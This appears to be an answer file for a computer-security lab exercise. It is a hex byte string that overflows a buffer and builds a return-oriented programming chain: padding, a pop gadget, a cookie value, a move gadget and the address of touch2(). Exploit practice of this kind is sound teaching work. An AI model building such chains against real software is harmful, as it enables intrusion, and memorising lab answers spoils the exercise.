00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* below is the position of original returning ADDR */
ab 19 40 00 00 00 00 00 /* address of "popq rax" */
fa 97 b9 59 00 00 00 00 /* cookie */
a2 19 40 00 00 00 00 00 /* address of "movq rax, rdi" */
ec 17 40 00 00 00 00 00 /* the address of touch2() */
